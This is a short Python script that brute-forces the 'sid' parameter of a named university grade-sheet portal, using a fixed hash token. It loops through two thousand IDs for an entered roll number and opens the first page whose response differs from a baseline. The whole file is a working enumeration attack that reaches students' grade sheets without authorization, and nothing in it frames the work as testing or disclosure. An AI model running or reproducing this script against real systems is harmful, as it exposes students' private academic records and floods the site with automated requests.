import sys
try:
	import hashlib
	import webbrowser
	from six.moves.urllib.request import urlopen
except:
	print('install first hashlib,webbrowser\n   python -m pip install six\n   python -m pip install hashlib\n   python -m pip install webbrowser\nThis code will run on python 3.x')
	sys.exit(0)
import os

N=str(input('Enter Roll : '))
link="http://academics.iitbhu.ac.in/grade_sheet/index.php?sname=15075040&sid=1487&ms1=95aea4c3483c560373356d1ba3fd73cc"

response = urlopen(link)
content2 = response.read()
try:
	os.system('cls')
except:
	os.system('clear')
print("searching the DB... (please wait)       Contact Naruto for any help")
for i in range(6000,8000):
	


	link='http://academics.iitbhu.ac.in/grade_sheet/index.php?sname='+N+'&sid='+str(i)+'&ms1=95aea4c3483c560373356d1ba3fd73cc'

	response = urlopen(link)
	content = response.read()
	
	if(content!=content2):
		
		
		webbrowser.open(link)
		break
else:
	print("record not found!")
